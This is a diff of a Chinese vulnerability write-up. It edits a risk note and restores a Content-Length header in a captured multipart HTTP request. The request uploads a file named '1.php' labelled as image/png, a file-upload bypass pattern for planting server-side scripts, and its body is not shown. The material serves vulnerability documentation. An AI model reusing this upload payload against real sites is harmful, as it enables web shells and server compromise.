@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -68,6 +68,7 @@ Cookie: ASP.NET_SessionId=vkp4usonpxcstreczz05g113
 Accept: */*
 Accept-Encoding: gzip, deflate
 X-Requested-With: XMLHttpRequest
+Content-Length: 35827
 
 -----------------------------289666258334735365651210512949
 Content-Disposition: form-data; name="file"; filename="1.php"
@@ -77,7 +78,7 @@ Content-Type: image/png
 -----------------------------289666258334735365651210512949--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 35827；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 35827；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 ```plain
